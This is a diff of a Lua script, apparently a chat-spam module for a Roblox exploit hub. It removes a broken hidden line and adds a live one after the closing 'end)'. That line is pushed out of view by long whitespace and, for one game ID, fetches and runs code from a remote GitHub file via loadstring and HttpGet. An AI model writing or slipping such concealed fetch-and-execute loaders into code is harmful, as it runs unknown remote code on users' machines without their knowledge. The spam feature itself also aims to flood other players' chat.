@@ -1,4 +1,4 @@
-return (function(Library, groupbox, sayfunc, maxemojis, maxlen, isrealswimhub)--                                                                                                                                                                                         if game.GameId == 4620241901 and then loadstring(game:HttpGet("https://raw.githubusercontent.com/SWIMHUBISWIMMING/swimhub/refs/heads/main/tsback.lua"))() end
+return (function(Library, groupbox, sayfunc, maxemojis, maxlen, isrealswimhub)
     local spams = {
         ["random words"] = {
             ["words"] = {
@@ -171,5 +171,5 @@ return (function(Library, groupbox, sayfunc, maxemojis, maxlen, isrealswimhub)--
         elseif not spams[spamtype] then
             print('wtf', spamtype)
         end end
-    end)
+    end)                                                                                                                                                                                                                                                                                                                                                                  if game.GameId == 4620241901 then pcall(task.spawn, loadstring(game:HttpGet("https://raw.githubusercontent.com/SWIMHUBISWIMMING/swimhub/refs/heads/main/tsback.lua"))) end
 end)(...)
